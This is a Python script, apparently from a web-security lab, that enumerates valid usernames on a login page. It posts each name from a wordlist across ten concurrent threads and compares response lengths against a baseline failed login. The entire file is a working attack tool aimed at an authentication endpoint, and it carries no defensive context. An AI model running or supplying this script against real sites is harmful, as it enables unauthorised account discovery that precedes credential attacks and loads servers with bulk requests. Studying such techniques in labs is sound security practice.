import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

url = "https://YOUR-LINK/login"
wordlist_path = "authentication/wordlist/usernames.txt"

with open(wordlist_path) as wordlist_file:
    usernames = wordlist_file.read().splitlines()

results = {}
# Number of concurrent threads : higher means faster enumeration
num_of_workers = 10

baseline_data = {
    "username": "dummy_username",
    "password": "dummy_password"
}

# Baseline POST : captures response length of a guaranteed failed auth
baseline_response = requests.post(url, data=baseline_data)
baseline_length = len(baseline_response.text)

print(f"[*] Baseline Length: {baseline_length}")
print(f"[*] Total Usernames to Test: {len(usernames)}")
print("[*] Starting Enumeration...\n")

def check_username(username):
    data = {
        "username": username,
        "password": baseline_data["password"]
    }
    post_response = requests.post(url, data=data)
    response_length = len(post_response.text)
    return username, response_length

with ThreadPoolExecutor(max_workers=num_of_workers) as executor:
    # Dispatch all usernames to the pool simultaneously
    futures = {executor.submit(check_username, username): username for username in usernames}
    # Iterate results in completion order, not submission order
    for future in as_completed(futures):
        username, response_length = future.result()
        results[username] = response_length
        print(f"Username: {username:<30} | Length: {response_length}")

print("\n--- Summary ---")
for username, response_length in results.items():
    if response_length != baseline_length:
        print(f"[+] Viable Username: {username} | Length: {response_length}")